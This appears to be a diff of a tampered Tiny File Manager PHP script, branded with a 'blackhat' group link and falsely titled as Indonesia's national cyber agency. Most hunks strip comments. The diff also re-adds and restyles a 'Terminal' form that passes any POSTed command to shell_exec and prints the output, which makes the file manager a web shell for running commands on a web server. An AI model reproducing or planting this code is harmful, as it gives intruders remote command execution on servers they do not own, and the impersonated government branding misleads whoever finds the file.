@@ -11,141 +11,108 @@ $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":
  * @link https://www.sukabumiblackhat.com
  */
 
-//TFM version
+
 define('VERSION', '2.5.3');
 
-//Application Title
+
 define('APP_TITLE', '(BSSN) Badan Siber Dan Sandi Negara');
 
-// --- EDIT BELOW CONFIGURATION CAREFULLY ---
 
-// Auth with login/password
-// set true/false to enable/disable it
-// Is independent from IP white- and blacklisting
 $use_auth = true;
 $auth_users = array(
     'adm' => '$2a$12$FyodXeykQEiLSQ.21BRJNeV6eD650tA8x/iz2RK.fRFUD5DXd2ziu', 
 );
 
-// Readonly users
-// e.g. array('users', 'guest', ...)
+
 $readonly_users = array(
     'user'
 );
 
-// Global readonly, including when auth is not being used
+
 $global_readonly = false;
 
-// user specific directories
-// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
+
 $directories_users = array();
 
-// Enable highlight.js (https://highlightjs.org/) on view's page
+
 $use_highlightjs = true;
 
-// highlight.js style
-// for dark theme use 'ir-black'
+
 $highlightjs_style = 'vs';
 
-// Enable ace.js (https://ace.c9.io/) on view's page
+
 $edit_files = true;
 
-// Default timezone for date() and time()
-// Doc - http://php.net/manual/en/timezones.php
-$default_timezone = 'Etc/UTC'; // UTC
 
-// Root path for file manager
-// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
+$default_timezone = 'Etc/UTC'; 
+
+
 $root_path = $_SERVER['DOCUMENT_ROOT'];
 
-// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
-// Will not working if $root_path will be outside of server document root
+
 $root_url = '';
 
-// Server hostname. Can set manually if wrong
-// $_SERVER['HTTP_HOST'].'/folder'
+
 $http_host = $_SERVER['HTTP_HOST'];
 
-// input encoding for iconv
+
 $iconv_input_encoding = 'UTF-8';
 
-// date() format for file modification date
-// Doc - https://www.php.net/manual/en/function.date.php
+
 $datetime_format = 'm/d/Y g:i A';
 
-// Path display mode when viewing file information
-// 'full' => show full path
-// 'relative' => show path relative to root_path
-// 'host' => show path on the host
+
 $path_display_mode = 'full';
 
-// Allowed file extensions for create and rename files
-// e.g. 'txt,html,css,js'
+
 $allowed_file_extensions = '';
 
-// Allowed file extensions for upload files
-// e.g. 'gif,png,jpg,html,txt'
+
 $allowed_upload_extensions = '';
 
-// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
-// full path, e.g http://example.com/favicon.png
-// local path, e.g images/icons/favicon.png
+
 $favicon_path = '';
 
-// Files and folders to excluded from listing
-// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
+
 $exclude_items = array();
 
-// Online office Docs Viewer
-// Availabe rules are 'google', 'microsoft' or false
-// Google => View documents using Google Docs Viewer
-// Microsoft => View documents using Microsoft Web Apps Viewer
-// false => disable online doc viewer
+
 $online_viewer = 'google';
 
-// Sticky Nav bar
-// true => enable sticky header
-// false => disable sticky header
+
 $sticky_navbar = true;
 
-// Maximum file upload size
-// Increase the following values in php.ini to work properly
-// memory_limit, upload_max_filesize, post_max_size
-$max_upload_size_bytes = 5000000000; // size 5,000,000,000 bytes (~5GB)
 
-// chunk size used for upload
-// eg. decrease to 1MB if nginx reports problem 413 entity too large
-$upload_chunk_size_bytes = 2000000; // chunk size 2,000,000 bytes (~2MB)
+$max_upload_size_bytes = 5000000000; 
 
-// Possible rules are 'OFF', 'AND' or 'OR'
-// OFF => Don't check connection IP, defaults to OFF
-// AND => Connection must be on the whitelist, and not on the blacklist
-// OR => Connection must be on the whitelist, or not on the blacklist
+
+$upload_chunk_size_bytes = 2000000; 
+
+
 $ip_ruleset = 'OFF';
 
-// Should users be notified of their block?
+
 $ip_silent = true;
 
-// IP-addresses, both ipv4 and ipv6
+
 $ip_whitelist = array(
-    '127.0.0.1',    // local ipv4
-    '::1'           // local ipv6
+    '127.0.0.1',    
+    '::1'           
 );
 
-// IP-addresses, both ipv4 and ipv6
+
 $ip_blacklist = array(
-    '0.0.0.0',      // non-routable meta ipv4
-    '::'            // non-routable meta ipv6
+    '0.0.0.0',      
+    '::'            
 );
 
-// if User has the external config file, try to use it to override the default config above [config.php]
-// sample config - https://tinyfilemanager.github.io/config-sample.txt
+
 $config_file = __DIR__.'/config.php';
 if (is_readable($config_file)) {
     @include($config_file);
 }
 
-// External CDN resources that can be used in the HTML (replace for GDPR compliance)
+
 $external = array(
     'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
     'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
@@ -161,40 +128,40 @@ $external = array(
     'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
 );
 
-// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---
 
-// max upload file size
+
+
 define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);
 
-// upload chunk size
+
 define('UPLOAD_CHUNK_SIZE', $upload_chunk_size_bytes);
 
-// private key and session name to store to the session
+
 if ( !defined( 'FM_SESSION_ID')) {
     define('FM_SESSION_ID', 'filemanager');
 }
 
-// Configuration
+
 $cfg = new FM_Config();
 
-// Default language
+
 $lang = isset($cfg->data['lang']) ? $cfg->data['lang'] : 'en';
 
-// Show or hide files and folders that starts with a dot
+
 $show_hidden_files = isset($cfg->data['show_hidden']) ? $cfg->data['show_hidden'] : true;
 
-// PHP error reporting - false = Turns off Errors, true = Turns on Errors
+
 $report_errors = isset($cfg->data['error_reporting']) ? $cfg->data['error_reporting'] : true;
 
-// Hide Permissions and Owner cols in file-listing
+
 $hide_Cols = isset($cfg->data['hide_Cols']) ? $cfg->data['hide_Cols'] : true;
 
-// Theme
+
 $theme = isset($cfg->data['theme']) ? $cfg->data['theme'] : 'light';
 
 define('FM_THEME', $theme);
 
-//available languages
+
 $lang_list = array(
     'en' => 'English'
 );
@@ -207,7 +174,7 @@ if ($report_errors == true) {
     @ini_set('display_errors', 0);
 }
 
-// if fm included
+
 if (defined('FM_EMBED')) {
     $use_auth = false;
     $sticky_navbar = false;
@@ -224,10 +191,10 @@ if (defined('FM_EMBED')) {
         mb_regex_encoding('UTF-8');
     }
 
-    session_cache_limiter('nocache'); // Prevent logout issue after page was cached
+    session_cache_limiter('nocache'); 
     session_name(FM_SESSION_ID );
     function session_error_handling_function($code, $msg, $file, $line) {
-        // Permission denied for default session, try to create a new one
+        
         if ($code == 2) {
             session_abort();
             session_id(session_create_id());
@@ -239,7 +206,7 @@ if (defined('FM_EMBED')) {
     restore_error_handler();
 }
 
-//Generating CSRF Token
+
 if (empty($_SESSION['token'])) {
     if (function_exists('random_bytes')) {
         $_SESSION['token'] = bin2hex(random_bytes(32));
@@ -255,26 +222,26 @@ if (empty($auth_users)) {
 $is_https = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
     || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';
 
-// update $root_url based on user specific directories
+
 if (isset($_SESSION[FM_SESSION_ID]['logged']) && !empty($directories_users[$_SESSION[FM_SESSION_ID]['logged']])) {
     $wd = fm_clean_path(dirname($_SERVER['PHP_SELF']));
     $root_url =  $root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[FM_SESSION_ID]['logged']];
 }
-// clean $root_url
+
 $root_url = fm_clean_path($root_url);
 
-// abs path for site
+
 defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
 defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);
 
-// logout
+
 if (isset($_GET['logout'])) {
     unset($_SESSION[FM_SESSION_ID]['logged']);
     unset( $_SESSION['token']); 
     fm_redirect(FM_SELF_URL);
 }
 
-// Validate connection IP
+
 if ($ip_ruleset != 'OFF') {
     function getClientIP() {
         if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
@@ -317,12 +284,12 @@ if ($ip_ruleset != 'OFF') {
     }
 }
 
-// Checking if the user is logged in or not. If not, it will show the login form.
+
 if ($use_auth) {
     if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
-        // Logged
+        
     } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
-        // Logging In
+        
         sleep(1);
         if(function_exists('password_verify')) {
             if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
@@ -338,7 +305,7 @@ if ($use_auth) {
             fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
         }
     } else {
-        // Form
+        
         unset($_SESSION[FM_SESSION_ID]['logged']);
         fm_show_header_login();
         ?>
@@ -401,12 +368,12 @@ if ($use_auth) {
     }
 }
 
-// update root path
+
 if ($use_auth && isset($_SESSION[FM_SESSION_ID]['logged'])) {
     $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]['logged']]) ? $directories_users[$_SESSION[FM_SESSION_ID]['logged']] : $root_path;
 }
 
-// clean and check $root_path
+
 $root_path = rtrim($root_path, '\\/');
 $root_path = str_replace('\\', '/', $root_path);
 if (!@is_dir($root_path)) {
@@ -424,22 +391,22 @@ defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $online_viewer);
 define('FM_READONLY', $global_readonly || ($use_auth && !empty($readonly_users) && isset($_SESSION[FM_SESSION_ID]['logged']) && in_array($_SESSION[FM_SESSION_ID]['logged'], $readonly_users)));
 define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
 
-// always use ?p=
+
 if (!isset($_GET['p']) && empty($_FILES)) {
     fm_redirect(FM_SELF_URL . '?p=');
 }
 
-// get path
+
 $p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');
 
-// clean path
+
 $p = fm_clean_path($p);
 
-// for ajax request - save
+
 $input = file_get_contents('php://input');
 $_POST = (strpos($input, 'ajax') != FALSE && strpos($input, 'save') != FALSE) ? json_decode($input, true) : $_POST;
 
-// instead globals vars
+
 define('FM_PATH', $p);
 define('FM_USE_AUTH', $use_auth);
 define('FM_EDIT_FILE', $edit_files);
@@ -452,14 +419,14 @@ unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style
 
 /*************************** ACTIONS ***************************/
 
-// Handle all AJAX Request
+
 if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
     if(!verifyToken($_POST['token'])) {
         header('HTTP/1.0 401 Unauthorized');
         die("Invalid Token.");
     }
 
-    //search : get list of files from the current folder
+    
     if(isset($_POST['type']) && $_POST['type']=="search") {
         $dir = $_POST['path'] == "." ? '': $_POST['path'];
         $response = scan(fm_clean_path($dir), $_POST['content']);
@@ -467,14 +434,14 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         exit();
     }
 
-    // save editor file
+    
     if (isset($_POST['type']) && $_POST['type'] == "save") {
-        // get current path
+        
         $path = FM_ROOT_PATH;
         if (FM_PATH != '') {
             $path .= '/' . FM_PATH;
         }
-        // check path
+        
         if (!is_dir($path)) {
             fm_redirect(FM_SELF_URL . '?p=');
         }
@@ -499,7 +466,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         die(true);
     }
 
-    // backup files
+    
     if (isset($_POST['type']) && $_POST['type'] == "backup" && !empty($_POST['file'])) {
         $fileName = fm_clean_path($_POST['file']);
         $fullPath = FM_ROOT_PATH . '/';
@@ -524,7 +491,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         }
     }
 
-    // Save Config
+    
     if (isset($_POST['type']) && $_POST['type'] == "settings") {
         global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
         $newLng = $_POST['js-language'];
@@ -566,13 +533,13 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         echo true;
     }
 
-    // new password hash
+    
     if (isset($_POST['type']) && $_POST['type'] == "pwdhash") {
         $res = isset($_POST['inputPassword2']) && !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
         echo $res;
     }
 
-    //upload using url
+    
     if(isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
         $path = FM_ROOT_PATH;
         if (FM_PATH != '') {
@@ -591,7 +558,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
 
         $url = !empty($_REQUEST["uploadurl"]) && preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;
 
-        //prevent 127.* domain and known ports
+        
         $domain = parse_url($url, PHP_URL_HOST);
         $port = parse_url($url, PHP_URL_PORT);
         $knownPorts = [22, 23, 25, 3306];
@@ -661,7 +628,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
     exit();
 }
 
-// Delete file / folder
+
 if (isset($_GET['del'], $_POST['token']) && !FM_READONLY) {
     $del = str_replace( '/', '', fm_clean_path( $_GET['del'] ) );
     if ($del != '' && $del != '..' && $del != '.' && verifyToken($_POST['token'])) {
@@ -683,7 +650,7 @@ if (isset($_GET['del'], $_POST['token']) && !FM_READONLY) {
     $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
 }
 
-// Create a new file/folder
+
 if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
     $type = urldecode($_POST['newfile']);
     $new = str_replace( '/', '', fm_clean_path( strip_tags( $_POST['newfilename'] ) ) );
@@ -718,31 +685,31 @@ if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READ
     $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
 }
 
-// Copy folder / file
+
 if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
-    // from
+    
     $copy = urldecode($_GET['copy']);
     $copy = fm_clean_path($copy);
-    // empty path
+    
     if ($copy == '') {
         fm_set_msg(lng('Source path not defined'), 'error');
         $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
     }
-    // abs path from
+    
     $from = FM_ROOT_PATH . '/' . $copy;
-    // abs path to
+    
     $dest = FM_ROOT_PATH;
     if (FM_PATH != '') {
         $dest .= '/' . FM_PATH;
     }
     $dest .= '/' . basename($from);
-    // move?
+    
     $move = isset($_GET['move']);
     $move = fm_clean_path(urldecode($move));
-    // copy/move/duplicate
+    
     if ($from != $dest) {
         $msg_from = trim(FM_PATH . '/' . basename($from), '/');
-        if ($move) { // Move and to != from so just perform move
+        if ($move) { 
             $rename = fm_rename($from, $dest);
             if ($rename) {
                 fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
@@ -751,7 +718,7 @@ if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
             } else {
                 fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
             }
-        } else { // Not move and to != from so copy with original name
+        } else { 
             if (fm_rcopy($from, $dest)) {
                 fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
             } else {
@@ -759,18 +726,18 @@ if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
             }
         }
     } else {
-       if (!$move){ //Not move and to = from so duplicate
+       if (!$move){ 
             $msg_from = trim(FM_PATH . '/' . basename($from), '/');
             $fn_parts = pathinfo($from);
             $extension_suffix = '';
             if(!is_dir($from)){
                $extension_suffix = '.'.$fn_parts['extension'];
             }
-            //Create new name for duplicate
+            
             $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-'.date('YmdHis').$extension_suffix;
             $loop_count = 0;
             $max_loop = 1000;
-            // Check if a file with the duplicate name already exists, if so, make new name (edge case...)
+            
             while(file_exists($fn_duplicate) & $loop_count < $max_loop){
                $fn_parts = pathinfo($fn_duplicate);
                $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-copy'.$extension_suffix;
@@ -789,19 +756,19 @@ if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
     $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
 }
 
-// Mass copy files/ folders
+
 if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) && !FM_READONLY) {
 
     if(!verifyToken($_POST['token'])) {
         fm_set_msg(lng('Invalid Token.'), 'error');
     }
     
-    // from
+    
     $path = FM_ROOT_PATH;
     if (FM_PATH != '') {
         $path .= '/' . FM_PATH;
     }
-    // to
+    
     $copy_to_path = FM_ROOT_PATH;
     $copy_to = fm_clean_path($_POST['copy_to']);
     if ($copy_to != '') {
@@ -1021,7 +988,7 @@ if (!empty($_FILES) && !FM_READONLY) {
                 }
 
             } else if (move_uploaded_file($tmp_name, $fullPath)) {
-                // Be sure that the file has been uploaded
+                
                 if ( file_exists($fullPath) ) {
                     $response = array (
                         'status'    => 'success',
@@ -2009,9 +1976,9 @@ if (isset($_GET['chmod']) && !FM_READONLY && !FM_IS_WIN) {
 
 // --- TINYFILEMANAGER MAIN ---
 fm_show_header(); // HEADER
-fm_show_nav_path(FM_PATH); // current path
+fm_show_nav_path(FM_PATH); 
 
-// show alert messages
+
 fm_show_message();
 
 $num_files = count($files);
@@ -2625,7 +2592,7 @@ function fm_get_size($file)
         $exec_works = (function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') == 'EXEC');
     }
 
-    // try a shell command
+    
     if ($exec_works) {
         $arg = escapeshellarg($file);
         $cmd = ($iswin) ? "for %F in (\"$file\") do @echo %~zF" : ($isdarwin ? "stat -f%z $arg" : "stat -c%s $arg");
@@ -3886,12 +3853,12 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 // Menangani perintah yang dikirim dari frontend
 $output = '';
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
-    // Mengambil perintah dari input pengguna dan memastikan keamanannya
-    $command = escapeshellcmd($_POST['command']);  // Escape untuk menghindari perintah berbahaya
-    $output = shell_exec($command);  // Menjalankan perintah
+    
+    $command = escapeshellcmd($_POST['command']);  
+    $output = shell_exec($command);  
 
     if ($output === null) {
-        $output = "Command execution failed or no output returned.";
+        $output = "Command Not Found";
     }
 } 
 ?>
@@ -3940,16 +3907,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         </ul>
     </div>
 
-    <!-- Terminal Input Section -->
-    <div class="terminal-input mt-5">
-        <li><strong>Terminal:</strong></li>
-        <form method="post" id="terminalForm">
-            <!-- Resize the textarea with smaller size -->
-            <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 60px; width: 30%;" placeholder="Enter Command.."></textarea>
-            <button type="submit" class="btn btn-primary mt-3" style="font-size: 13px; padding: 3px 5px;">Run Command</button>
-        </form>
+
+<div class="terminal-input mt-5">
+    <li style="margin-left: 35px;"><strong>Terminal:</strong></li>
+    <form method="post" id="terminalForm" style="margin-left: 20px;">
+        <!-- Resize the textarea with smaller size -->
+        <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 20px; width: 30%; margin-bottom: 10px;" placeholder="Enter Command.."></textarea>
+        <button type="submit" class="btn btn-primary mt-3" style="font-size: 13px; padding: 3px 5px; margin-top: 10px;">Run Command</button>
+    </form>
         
-        <li><strong>Output:</strong></li>
+        <li style="margin-left: 2%;"><strong>Output:</strong></li>
         <strong><pre id="terminalOutput"><?php echo htmlspecialchars($output); ?></pre></strong>
     </div>
 </div>
@@ -3967,9 +3934,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
                 return;
             }
 
-            // Kirimkan perintah ke server
+            
             $.ajax({
-                url: '', // Menyubmit ke halaman yang sama
+                url: '', 
                 type: 'POST',
                 data: { command: input },
                 success: function(response) {
@@ -3977,7 +3944,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
                     var outputStart = response.indexOf("<pre id=\"terminalOutput\">") + 25; 
                     var outputEnd = response.indexOf("</pre>");
                     var output = response.substring(outputStart, outputEnd);
-                    $('#terminalOutput').text(output); // Menampilkan output di halaman
+                    $('#terminalOutput').text(output); 
                 },
                 error: function() {
                     $('#terminalOutput').text("Error executing the command.");
@@ -3988,11 +3955,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
             $('#terminalInput').val("");
         });
 
-        // Menangani event ketika tombol "Enter" ditekan di textarea
+        
         $('#terminalInput').on('keypress', function(e) {
-            if (e.which == 13) { // Kode tombol untuk "Enter" adalah 13
-                e.preventDefault(); // Mencegah form submit otomatis
-                $('#terminalForm').submit(); // Memanggil fungsi submit form secara manual
+            if (e.which == 13) { 
+                e.preventDefault(); 
+                $('#terminalForm').submit(); 
             }
         });
     });
@@ -4132,7 +4099,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         }
     }
     function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
-    // Save Settings
+    
     function save_settings($this) {
         let form = $($this);
         $.ajax({
@@ -4140,7 +4107,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
             success: function (data) {if(data) { window.location.reload();}}
         }); return false;
     }
-    //Create new password hash
+    
     function new_password_hash($this) {
         let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
         $.ajax({
@@ -4148,7 +4115,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
             success: function (data) { if(data) { $pwd.val(data); } }
         }); return false;
     }
-    // Upload files using URL @param {Object}
+    
     function upload_from_url($this) {
         let form = $($this), resultWrapper = $("div#js-url-upload__list");
         $.ajax({
@@ -4168,7 +4135,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
             }
         }); return false;
     }
-    // Search template
+    
     function search_template(data) {
         var response = "";
         $.each(data, function (key, val) {
@@ -4176,7 +4143,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         });
         return response;
     }
-    // Advance search
+    
     function fm_search() {
         var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
         if(!!searchTxt && searchTxt.length > 2 && path) {
@@ -4203,7 +4170,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
     }
 
-    // action confirm dailog modal
+    
     function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
         e.preventDefault();
         const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
@@ -4216,10 +4183,10 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
     }
     
 
-    // on mouse hover image preview
+    
     !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);
 
-    // Dom Ready Events
+    
     $(document).ready( function () {
         // dataTable init
         var $table = $('#main-table'),
@@ -4227,7 +4194,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
             _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
             mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
         });
-        // filter table
+        
         $('#search-addon').on( 'keyup', function () {
             mainTable.search( this.value ).draw();
         });
